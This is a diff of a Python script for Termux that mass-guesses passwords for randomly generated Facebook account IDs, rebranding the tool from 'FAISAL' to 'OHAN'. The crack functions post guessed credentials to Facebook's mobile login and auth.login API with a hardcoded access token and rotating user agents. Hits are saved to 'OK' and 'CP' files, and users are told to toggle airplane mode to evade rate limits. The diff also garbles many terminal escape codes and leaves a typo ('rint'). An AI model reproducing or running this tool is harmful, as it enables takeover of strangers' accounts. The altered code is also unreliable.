@@ -1,10 +1,10 @@
-W = '\033[97;1m'
-R = '\033[91;1m'
-G = '\033[92;1m'
-Y = '\033[93;1m'
-B = '\033[94;1m'
-P = '\033[95;1m'
-C = '\033[96;1m'
+W = '\333[97;1m'
+R = '\333[91;1m'
+G = '\333[92;1m'
+Y = '\333[93;1m'
+B = '\333[94;1m'
+P = '\333[95;1m'
+C = '\333[96;1m'
 N = '\x1b[0m'
 import os
 try:
@@ -61,12 +61,12 @@ try:
 except:pass
 # COLORS
 x = '\33[m' 
-k = '\033[93m' 
+k = '\333[93m' 
 h = '\x1b[1;92m' 
-hh = '\033[32m' 
-u = '\033[95m' 
-K = '\033[95m' 
-kk = '\033[33m' 
+hh = '\333[32m' 
+u = '\333[95m' 
+K = '\333[95m' 
+kk = '\333[33m' 
 b = '\33[1;96m' 
 p = '\x1b[0;34m' 
 # Converter 
@@ -84,14 +84,14 @@ def clear():
 def back():
 	login()
 
-TALHA="Faisal-"
+TALHA="OHAN-"
 imt="-Busra4786=="
 ak="Lover-"
 myid=uuid.uuid4().hex[:10].upper()
 try:
-	key1 = open('/data/data/com.termux/files/usr/bin/.mrFAISAL-cov', 'r').read()
+	key1 = open('/data/data/com.termux/files/usr/bin/.mrOHAN-cov', 'r').read()
 except:
-	kok=open('/data/data/com.termux/files/usr/bin/.mrFAISAL-cov', 'w')
+	kok=open('/data/data/com.termux/files/usr/bin/.mrOHAN-cov', 'w')
 	kok.write(myid+imt)
 	kok.close()
 def login():
@@ -204,7 +204,7 @@ def setting():
 		print (' [!] Choose Correct Option')
 		exit()
 	clear()
-	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \033[1;97m')
+	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \333[1;97m')
 	hc = input ("\n [#] method : ")
 	if hc in ['1','01']:
 		method.append('mobile')
@@ -228,7 +228,7 @@ def passmenu():
 		
 def first():
 	clear()
-	print(logo);print( ' [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
+	print(logo);print( ' [!] \333[1;96mTurn Airplane Mode On/Off Every 5 Minutes\333[1;0m\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -255,7 +255,7 @@ def first():
 				pool.submit(crack,idf,pwv)
 def name():
 	clear()
-	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [] OK Result Saved To : \333[1;92mOK/%s\333[1;97m\n [] CP Result Saved To : \333[1;91mCP/%s\333[1;97m\n [!] \333[1;96mTurn Airplane Mode On/Off Every 5 Minutes\333[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			try:
@@ -275,7 +275,7 @@ def name():
 				pass
 def name2():
 	clear()
-	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [] OK Result Saved To : \333[1;92mOK/%s\333[1;97m\n [] CP Result Saved To : \333[1;91mCP/%s\333[1;97m\n [!] \333[1;96mTurn Airplane Mode On/Off Every 5 Minutes\333[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -309,7 +309,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ FAISAL ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ OHAN ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -324,14 +324,14 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ FAISAL-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ OHAN-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ FAISAL-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ OHAN-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -348,7 +348,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ FAISAL ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ OHAN ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -362,17 +362,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ FAISAL-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ OHAN-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ FAISAL-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ OHAN-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/Faisal-OK','a').write('%s\n' % wrt)
+				open('/sdcard/OHAN-OK','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -392,10 +392,10 @@ logo = ("""\000
 ________________________________________×____________________________________
   
   Owner   :. OHAN RONNIE
- 
-  Github   :  OhanRonnie
 
-  Facebook :. PAUL
+  Github  :  Ohan Ronnie
+
+  Facebook : PAUL
   
   Youtube :   ERROR 404
   
@@ -410,12 +410,12 @@ class Main:
 		self.loop = 0
 		os.system("clear")
 		print(logo)
-		print("\n \t \t            [1] 2009 - 2010 CLONE -- [BEST]")
-		print("\t \t            [2] 2011 - 2014 CLONE")
-		print("\t \t            [3] FILE CLONE")
-		print("\t \t            [4] PUBLIC CLONE  -- [GOOD] ")
-		print("\t \t            [5] CREATE FILE ")
-		print("\t \t.           [E] \n")
+		print("\n \t \t[1] 2009 - 2010 CLONE -- [BEST]")
+		print("[2] 2011 - 2014 CLONE")
+		print("[3] FILE CLONE")
+		print("[4] PUBLIC CLONE  -- [GOOD] ")
+		print("[5] CREATE FILE ")
+		print("[E] EXIT \n")
 		TALHA =input(" Choose : ")
 		if TALHA in ["3", "03"]:
 			File()
@@ -438,20 +438,20 @@ class Main:
 		xx = 999999999
 		idx = "100000" 
 		os.system('clear');print(logo)
-		limit = int(input(" \n\000[0;95m[+]\000[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
+		limit = int(input(" \n\235[+]\235 TOTAL IDS TO CRACK LIMIT 50,000:\235 "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
 				__ = idx
 				self.id.append(__+str(_))
 			
-			print("\000[0;93m [+] TOTAL ID -> \000[0;91m%s\000[0;97m"%(len(self.id))) 
+			print("\000[+] TOTAL ID ->\000"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\000[1;32m [!] USE (123456) FOR IDZ\000[1;37m ")
+				print("\n\000[!] USE (123456) FOR IDZ\000")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
-				print("%s [*] CRACK WITH PASSWORD -> [\000[0;91m%s\000[0;93m]"%(G,listpass))
+				print("%s [*] CRACK WITH PASSWORD -> \000"%(G,listpass))
 				os.system("clear")
 				print(logo)
 				print("\n%s [+] VISIT MYPROFILE AnD FOLOw ME "%(Y))
@@ -845,8 +845,8 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \000[0;92m[ FAISAL-OK ] %s | %s\000[0;97m         "%(uid, pw))
-				print ("\r \033[0;92m Congrats Bro ")
+				print("\r \000[0;92m[ OHAN-OK ] %s | %s\000[0;97m         "%(uid, pw))
+				print ("\r \333[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-OHAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
@@ -865,20 +865,20 @@ class Main:
 		xx = 9999999999
 		idx = "10000" 
 		os.system('clear');print(logo)
-		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
+		limit = int(input("\n \333[0;95m[+]\333[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
 				__ = idx
 				self.id.append(__+str(_))
 			
-			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			print("\333[0;93m [+] TOTAL ID -> \333[0;91m%s\333[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
+				print("\n\333[1;32m [!] USE (123456) FOR IDZ\333[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
-				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
+				print("%s [*] CRACK WITH PASSWORD -> [\333[0;91m%s\333[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
 				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
@@ -1255,7 +1255,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ FAISAL ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ OHAN ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1272,15 +1272,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ FAISAL-OK ] %s | %s\033[0;97m         "%(uid, pw))
-				print ("\r \033[0;92m Congrats Bro ")
+				print("\r \333[0;92m[ OHAN-OK ] %s | %s\333[0;97m         "%(uid, pw))
+				print ("\r \333[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-FAISAL-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-OHAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ FAISAL-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \333[0;92m[ OHAN-OK ] %s | %s\333[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-FAISAL-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-OHAN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1289,7 +1289,7 @@ class Main:
 
 
 def Subscraption():
-	key1=open('/data/data/com.termux/files/usr/bin/.mrFAISAL-cov', 'r').read()
+	key1=open('/data/data/com.termux/files/usr/bin/.mrOHAN-cov', 'r').read()
 	clear()
 	print(logo)
 	r1=requests.get("https://pastebin.com/p3jbWM14").text
@@ -1300,13 +1300,13 @@ def Subscraption():
 	else:
 		os.system("clear")
 		print(logo)
-		print("\t \033[1;32m First Get Approvel\033[1;37m ")
+		print("\t \333[1;32m First Get Approvel\333[1;37m ")
 		time.sleep(1)
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m FAISAL  Toll Paid You Need Get Approved First\033[1;37m\n")
-		print(" \033[1;32m Note : Paid Tolls Free  HA JANI LOG \033[1;37m")
+		print(" \333[1;32m OHAN  Toll Paid You Need Get Approved First\333[1;37m\n")
+		print(" \333[1;32m Note : Paid Tolls Free  HA JANI LOG \333[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
